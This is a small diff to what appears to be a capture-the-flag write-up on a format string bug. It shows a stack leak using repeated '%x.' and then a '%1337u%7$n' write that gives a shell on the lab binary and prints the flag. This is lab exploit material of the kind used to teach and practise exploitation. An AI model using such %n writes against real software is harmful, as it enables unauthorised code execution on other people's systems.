@@ -43,6 +43,7 @@ $ ./format $(python -c "print '%x.'*7")
 ffffd7c4.ffffd7d0.f7e4f39d.f7fc83c4.f7ffd000.804852b.804a030.
 
 $ ./format '%1337u%7$n'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               $ id
+$ id
 uid=13315(pico22418) gid=1008(format) groups=1017(picogroup)
 $ cat flag.txt
 who_thought_%n_was_a_good_idea?
